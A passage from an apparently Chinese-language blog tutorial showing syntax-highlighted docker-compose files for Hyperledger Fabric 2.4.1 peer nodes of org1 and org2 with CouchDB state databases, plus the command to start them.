class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs haml">version: &#x27;2.0&#x27;<br><br>services:<br><br>    peer0.org1.example.com:<br>        image: hyperledger/fabric-peer:2.4.1<br>        restart: always<br>        container_name: peer0.org1.example.com<br>        hostname: peer0.org1.example.com<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">7051</span><span class="hljs-symbol">:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">7052</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">9443</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span></span><br><span class="ruby"></span>        extra_hosts:<br>            -<span class="ruby"> <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> FABRIC_LOGGING_SPEC=INFO</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESSAUTODETECT=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=host  <span class="hljs-comment"># uncomment this to use specific network</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_USELEADERELECTION=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_ORGLEADER=<span class="hljs-literal">false</span>  <span class="hljs-comment"># whether this node is the org leader, default to false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span>  <span class="hljs-comment"># operation RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_METRICS_PROVIDER=prometheus  <span class="hljs-comment"># prometheus will pull metrics from fabric via /metrics RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_PROFILE_ENABLED=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ENABLED=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_CERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/server.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_PEER_TLS_KEY_FILE=/etc</span><span class="hljs-regexp">/hyperledger/fabric</span><span class="hljs-regexp">/tls/server</span>.key</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/ca.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_CHAINCODE_BUILDER=hyperledger/fabric</span>-<span class="hljs-symbol">ccenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_GOLANG_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">baseos:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_JAVA_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">javaenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_NODE_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">nodeenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ID=peer0.org1.example.com</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESS=peer0.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODELISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODEADDRESS=peer0.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_BOOTSTRAP=peer0.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_LOCALMSPID=Org1MSP</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_SPEC=DEBUG <span class="hljs-comment"># info:core.chaincode=debug</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_STATEDATABASE=CouchDB</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=peer0.org1.<span class="hljs-symbol">couchdb:</span><span class="hljs-number">5984</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=admin</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=adminpw</span><br><span class="ruby"></span>        volumes:<br>            -<span class="ruby"> /var/run/docker.<span class="hljs-symbol">sock:</span>/var/run/docker.sock</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/<span class="hljs-symbol">msp:</span>/etc/hyperledger/fabric/msp</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/<span class="hljs-symbol">tls:</span>/etc/hyperledger/fabric/tls</span><br><span class="ruby"></span>        expose:<br>            -<span class="ruby"> <span class="hljs-string">&quot;7051&quot;</span>  <span class="hljs-comment"># gRPC</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;9443&quot;</span>  <span class="hljs-comment"># Operation REST</span></span><br><span class="ruby"></span>        #command: bash -c &#x27;bash /tmp/peer_build.sh; peer node start&#x27;<br>        command: peer node start<br>        depends_on:<br>            -<span class="ruby"> peer0.org1.couchdb</span><br><span class="ruby"></span><br>    peer1.org1.example.com:<br>        image: hyperledger/fabric-peer:2.4.1<br>        restart: always<br>        container_name: peer1.org1.example.com<br>        hostname: peer1.org1.example.com<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">8051</span><span class="hljs-symbol">:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">8052</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">9444</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span></span><br><span class="ruby"></span>        extra_hosts:<br>            -<span class="ruby"> <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> FABRIC_LOGGING_SPEC=INFO</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESSAUTODETECT=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=host  <span class="hljs-comment"># uncomment this to use specific network</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_USELEADERELECTION=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_ORGLEADER=<span class="hljs-literal">false</span>  <span class="hljs-comment"># whether this node is the org leader, default to false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span>  <span class="hljs-comment"># operation RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_METRICS_PROVIDER=prometheus  <span class="hljs-comment"># prometheus will pull metrics from fabric via /metrics RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_PROFILE_ENABLED=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ENABLED=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_CERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/server.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_PEER_TLS_KEY_FILE=/etc</span><span class="hljs-regexp">/hyperledger/fabric</span><span class="hljs-regexp">/tls/server</span>.key</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/ca.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_CHAINCODE_BUILDER=hyperledger/fabric</span>-<span class="hljs-symbol">ccenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_GOLANG_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">baseos:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_JAVA_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">javaenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_NODE_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">nodeenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ID=peer1.org1.example.com</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESS=peer1.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">8051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODELISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">8052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODEADDRESS=peer1.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">8052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer1.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">8051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_BOOTSTRAP=peer1.org1.example.<span class="hljs-symbol">com:</span><span class="hljs-number">8051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_LOCALMSPID=Org1MSP</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_SPEC=DEBUG <span class="hljs-comment"># info:core.chaincode=debug</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_STATEDATABASE=CouchDB</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=peer1.org1.<span class="hljs-symbol">couchdb:</span><span class="hljs-number">5984</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=admin</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=adminpw</span><br><span class="ruby"></span>        volumes:<br>            -<span class="ruby"> /var/run/docker.<span class="hljs-symbol">sock:</span>/var/run/docker.sock</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/<span class="hljs-symbol">msp:</span>/etc/hyperledger/fabric/msp</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/<span class="hljs-symbol">tls:</span>/etc/hyperledger/fabric/tls</span><br><span class="ruby"></span>        expose:<br>            -<span class="ruby"> <span class="hljs-string">&quot;8051&quot;</span>  <span class="hljs-comment"># gRPC</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;8052&quot;</span>  <span class="hljs-comment"># chaincode</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;9444&quot;</span>  <span class="hljs-comment"># Operation REST</span></span><br><span class="ruby"></span>        #command: bash -c &#x27;bash /tmp/peer_build.sh; peer node start&#x27;<br>        command: peer node start<br>        depends_on:<br>            -<span class="ruby"> peer0.org1.couchdb</span><br><span class="ruby"></span>                    <br>    peer0.org1.couchdb:<br>        image: couchdb:3.1.1<br>        container_name: peer0.org1.couchdb<br>        restart: always<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">5984</span><span class="hljs-symbol">:</span><span class="hljs-number">5984</span>  <span class="hljs-comment"># this is the restful API addr, can also access fauxton web ui thru http://localhost:5984/_utils/</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> COUCHDB_USER=admin</span><br><span class="ruby"></span>            -<span class="ruby"> COUCHDB_PASSWORD=adminpw</span><br><span class="ruby"></span><br>    peer1.org1.couchdb:<br>        image: couchdb:3.1.1<br>        container_name: peer1.org1.couchdb<br>        restart: always<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">6984</span><span class="hljs-symbol">:</span><span class="hljs-number">5984</span>  <span class="hljs-comment"># this is the restful API addr, can also access fauxton web ui thru http://localhost:5984/_utils/</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> COUCHDB_USER=admin</span><br><span class="ruby"></span>            -<span class="ruby"> COUCHDB_PASSWORD=adminpw</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#启动peer节点</span><br><span class="hljs-attribute">docker</span>-compose -f docker-compose-org<span class="hljs-number">1</span>-peer.yaml up -d<br></code></pre></td></tr></table></figure><h3 id="启动org2-peer节点"><a href="#启动org2-peer节点" class="headerlink" title="启动org2-peer节点"></a>启动org2-peer节点</h3><p>org2-peer节点docker配置文件</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs haml"><br>version: &#x27;2.0&#x27;<br><br>services:<br><br>    peer0.org2.example.com:<br>        image: hyperledger/fabric-peer:2.4.1<br>        restart: always<br>        container_name: peer0.org2.example.com<br>        hostname: peer0.org2.example.com<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">9051</span><span class="hljs-symbol">:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">9052</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">9445</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span></span><br><span class="ruby"></span>        extra_hosts:<br>            -<span class="ruby"> <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span></span><br><span class="ruby"></span>        environment:<br>            -<span class="ruby"> FABRIC_LOGGING_SPEC=INFO</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_FORMAT=<span class="hljs-string">&quot;%&#123;color&#125;%&#123;time:2006-01-02 15:04:05.000 MST&#125; [%&#123;module&#125;] %&#123;shortfunc&#125; -&gt; %&#123;level:.4s&#125; %&#123;id:03x&#125;%&#123;color:reset&#125; %&#123;message&#125;&quot;</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESSAUTODETECT=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE=host  <span class="hljs-comment"># uncomment this to use specific network</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_USELEADERELECTION=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_ORGLEADER=<span class="hljs-literal">false</span>  <span class="hljs-comment"># whether this node is the org leader, default to false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_OPERATIONS_LISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span>  <span class="hljs-comment"># operation RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_METRICS_PROVIDER=prometheus  <span class="hljs-comment"># prometheus will pull metrics from fabric via /metrics RESTful API</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_PROFILE_ENABLED=<span class="hljs-literal">false</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ENABLED=<span class="hljs-literal">true</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_CERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/server.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_PEER_TLS_KEY_FILE=/etc</span><span class="hljs-regexp">/hyperledger/fabric</span><span class="hljs-regexp">/tls/server</span>.key</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-regexp">/etc/hyperledger</span><span class="hljs-regexp">/fabric/tls</span><span class="hljs-regexp">/ca.crt</span></span><br><span class="hljs-regexp"><span class="ruby"></span></span>            -<span class="ruby"><span class="hljs-regexp"> CORE_CHAINCODE_BUILDER=hyperledger/fabric</span>-<span class="hljs-symbol">ccenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_GOLANG_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">baseos:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_JAVA_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">javaenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_CHAINCODE_NODE_RUNTIME=hyperledger/fabric-<span class="hljs-symbol">nodeenv:</span><span class="hljs-number">2.4</span>.<span class="hljs-number">1</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ID=peer0.org2.example.com</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_ADDRESS=peer0.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">9051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODELISTENADDRESS=<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_CHAINCODEADDRESS=peer0.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">9052</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_EXTERNALENDPOINT=peer0.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">9051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_GOSSIP_BOOTSTRAP=peer0.org2.example.<span class="hljs-symbol">com:</span><span class="hljs-number">9051</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_PEER_LOCALMSPID=Org2MSP</span><br><span class="ruby"></span>            -<span class="ruby"> FABRIC_LOGGING_SPEC=DEBUG <span class="hljs-comment"># info:core.chaincode=debug</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_STATEDATABASE=CouchDB</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_COUCHDBADDRESS=peer0.org1.<span class="hljs-symbol">couchdb:</span><span class="hljs-number">5984</span></span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_USERNAME=admin</span><br><span class="ruby"></span>            -<span class="ruby"> CORE_LEDGER_STATE_COUCHDBCONFIG_PASSWORD=adminpw</span><br><span class="ruby"></span>        volumes:<br>            -<span class="ruby"> /var/run/docker.<span class="hljs-symbol">sock:</span>/var/run/docker.sock</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/<span class="hljs-symbol">msp:</span>/etc/hyperledger/fabric/msp</span><br><span class="ruby"></span>            -<span class="ruby"> ./crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/<span class="hljs-symbol">tls:</span>/etc/hyperledger/fabric/tls</span><br><span class="ruby"></span>        expose:<br>            -<span class="ruby"> <span class="hljs-string">&quot;9051&quot;</span>  <span class="hljs-comment"># gRPC</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-string">&quot;9445&quot;</span>  <span class="hljs-comment"># Operation REST</span></span><br><span class="ruby"></span>        #command: bash -c &#x27;bash /tmp/peer_build.sh; peer node start&#x27;<br>        command: peer node start<br>        depends_on:<br>            -<span class="ruby"> peer0.org2.couchdb</span><br><span class="ruby"></span><br><br>    peer1.org2.example.com:<br>        image: hyperledger/fabric-peer:2.4.1<br>        restart: always<br>        container_name: peer1.org2.example.com<br>        hostname: peer1.org2.example.com<br>        ports:<br>            -<span class="ruby"> <span class="hljs-number">10051</span><span class="hljs-symbol">:</span><span class="hljs-number">7051</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">10052</span><span class="hljs-symbol">:</span><span class="hljs-number">7052</span></span><br><span class="ruby"></span>            -<span class="ruby"> <span class="hljs-number">9446</span><span class="hljs-symbol">:</span><span class="hljs-number">9443</span></span><br><span class="ruby"></span>        extra_hosts:<br>            -<span 